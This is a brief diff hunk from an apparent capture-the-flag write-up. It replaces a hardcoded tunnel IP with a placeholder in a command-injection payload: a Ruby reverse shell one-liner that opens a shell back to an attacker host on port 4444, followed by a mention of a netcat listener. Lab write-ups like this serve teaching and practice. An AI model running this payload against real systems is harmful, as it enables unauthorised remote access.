@@ -239,7 +239,7 @@ http%20`<command here>`
 Ill use ruby reverse shell trying get one on my machine.
 
 ```bash
-<http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.18",4444))'`
+<http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("<tun-ip>",4444))'`
 ```
 
 set netcat listener:
